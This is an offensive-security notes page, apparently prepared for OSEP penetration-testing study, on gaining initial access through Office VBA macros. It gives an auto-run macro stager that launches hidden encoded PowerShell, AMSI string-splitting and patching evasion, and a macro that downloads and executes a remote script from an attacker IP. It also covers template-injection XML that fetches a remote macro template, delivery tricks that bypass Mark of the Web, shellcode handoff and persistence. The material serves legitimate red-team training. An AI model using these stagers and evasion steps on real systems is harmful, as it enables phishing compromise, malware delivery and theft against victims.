---
title: Office VBA macros for initial access
slug: office-vba-macros-initial-access
aliases: [vba-macros, office-macros]
---

{% raw %}

> **TL;DR:** A Word/Excel macro is VBA code that can spawn arbitrary processes and download/run payloads. Modern Office blocks macros from internet-sourced docs by default (MOTW), and AMSI now scans VBA at runtime, so initial-access tradecraft is: pick a container that strips MOTW, write VBA that defeats AMSI string detection, and deliver a stager that hands off to a more durable payload as fast as possible. Companion to [[client-side-attacks-primer]] and [[osep-roadmap]].

## File-format choices

| Ext | Notes |
|---|---|
| `.docm` | Macro-enabled Word — most common, most flagged |
| `.xlsm` | Macro-enabled Excel — slightly less mail-filtered |
| `.dotm` / `.xltm` | *Template* — opening a template doesn't carry MOTW the same way; useful via `Template Injection` (loading a remote `.dotm` from a clean `.docx`) |
| `.xls` (Excel 4 macros / XLM) | Legacy, separate macro engine — now blocked by default but still useful against unpatched Office |
| `.pub` (Publisher) | Niche, sometimes survives filters |

## Minimum-viable VBA stager

```vba
Sub AutoOpen()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -ep bypass -enc " & _
           "JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQ...", _
           0, False
End Sub
Sub Workbook_Open()
    AutoOpen
End Sub
```

`AutoOpen` (Word) and `Workbook_Open` (Excel) fire on document open if macros are enabled. Provide both so the same file works either way.

## AMSI on macros

Since Office 365 / 2016+, AMSI scans VBA at runtime — both source and the strings you build dynamically. You'll see detections on:
- Literal `powershell` strings.
- `Shell.Application`, `WScript.Shell` strings (lower trigger rate but watched).
- `DownloadString`, `FromBase64String`.

Standard string-splitting trick:
```vba
Dim a As String
a = "po" & "wer" & "sh" & "ell"      ' AMSI sees "po" then "wer"... harder to match
```

Better: defeat AMSI in the host process *before* you call out to PowerShell:

```vba
Sub AutoOpen()
    Dim mem As LongPtr, dummy As LongPtr
    ' Resolve VirtualProtect, find amsi.dll!AmsiScanBuffer, patch the prologue
    ' to "xor eax, eax; ret" (return AMSI_RESULT_CLEAN).
    PatchAmsi
    Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')", vbHide
End Sub
```

See [[amsi-bypass]] for the patch implementation; the technique used inside VBA is identical to the one used from a .NET loader.

## Mark of the Web (MOTW)

Downloaded files carry a Zone.Identifier alternate data stream. Office uses it to put the document in Protected View and (per recent policy) block macros entirely from internet-sourced files.

MOTW-stripping containers (vendors continue to close these):
- ISO / IMG — `.iso` mounts as a drive; files extracted *historically* did not inherit MOTW. Microsoft closed this for ISOs in 2022.
- VHD / VHDX — similar story, partly closed.
- 7z self-extracting archives — depends on extractor.
- Password-protected ZIP — the user types the password to extract; the extractor *may* not propagate MOTW.

Practical OSEP play: ship a password-protected zip containing the `.docm`; password in the email body. User extracts, opens, macro fires.

## Template injection (preferred modern delivery)

1. Send a clean `.docx` (no macros, no AMSI triggers).
2. Inside `word/_rels/settings.xml.rels` set the template `Target` to `http://attacker/payload.dotm`.
3. When Word opens, it fetches the remote template and runs *its* macros.

Why it works: the carrier is clean (passes mail filters), the payload is server-side (you can swap it per target), and the delivery cleanly separates carrier from execution.

```xml
<!-- word/_rels/settings.xml.rels (snippet) -->
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
                Target="http://10.10.14.5/normal.dotm" TargetMode="External"/>
</Relationships>
```

## Defeat-by-design: handoff to a real payload

VBA is a bad place to live. Your stager should:
1. Allocate memory in the Word process (or a freshly-spawned child).
2. Copy shellcode bytes in.
3. Hand execution to it.
4. Exit cleanly so Word doesn't crash visibly to the user.

The handoff is a Win32 API call chain (`VirtualAlloc`, `CreateThread` or `CreateRemoteThread`, `WaitForSingleObject`), or — for OSEP — a managed loader using `Process.GetCurrentProcess`, .NET reflection, and unmanaged P/Invoke.

## Persistence (post-foothold)
- Add yourself as a Word add-in (`%APPDATA%\Microsoft\Word\STARTUP\*.dotm`) — survives reboots, loads on every Word launch.
- Drop a scheduled task via `schtasks` (more general).
- Trigger on user logon via registry Run key.

See [[persistence-techniques-windows]].

## Defence (so you know what you're bypassing)

- Group policy: block macros from internet entirely.
- ASR rule: "Block all Office applications from creating child processes".
- AMSI plus EDR script visibility.
- Attack Surface Reduction telemetry on `WINWORD.EXE → powershell.exe` chains.

A modern engagement assumes all of the above and reaches for template injection + AMSI patching + non-PowerShell handoff (.NET assembly, syscall stub) before the macro even calls into the OS.

## References
- [Microsoft — Block macros from the internet](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)
- [Outflank — Old-school but golden: VBA stomping](https://outflank.nl/blog/2018/10/06/old-school-evasion-with-excel-4-0-macros/)
- [MDSec — Office macros and AMSI](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- See also: [[client-side-attacks-primer]], [[jscript-hta-wsh-initial-access]], [[amsi-bypass]], [[applocker-bypass-techniques]], [[persistence-techniques-windows]]

{% endraw %}
